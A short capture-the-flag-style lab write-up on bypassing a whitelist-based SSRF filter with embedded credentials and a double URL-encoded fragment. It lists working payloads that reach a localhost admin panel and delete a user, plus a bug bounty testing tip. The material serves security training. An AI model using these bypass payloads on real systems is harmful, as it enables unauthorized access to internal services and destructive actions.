## LAB: SSRF with Whitelist-Based Input Filter

**Vulnerability:** SSRF - whitelist bypass using embedded credentials and URL fragment encoding

**Steps:**
- Confirm only whitelisted domain (e.g. `stock.weliketoshop.net`) is accepted
- Test `http://username@stock.weliketoshop.net/` confirm embedded credentials are parsed
- Append double URL encoded `#` (`%2523`) to username to trick URL parser
- Use `http://localhost:80%2523@stock.weliketoshop.net/admin` to access admin panel
- Append delete path to execute action on target user

**Key payloads/paths:**
- `http://username@stock.weliketoshop.net/`
- `http://localhost:80%2523@stock.weliketoshop.net/admin`
- `http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos`

**Bug Bounty Testing:** If a whitelist is in place, test embedded
credentials with `@` and URL fragment tricks with `#` the server and
URL parser may interpret the URL differently, allowing whitelist bypass
